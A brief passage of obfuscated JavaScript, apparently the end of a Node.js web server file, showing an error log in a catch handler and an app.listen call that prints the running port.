_0x3bdc95=_0xf73b7c;console['error'](_0x3bdc95(0x1d2),_0x457db2);}),app[_0xf73b7c(0x1fd)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
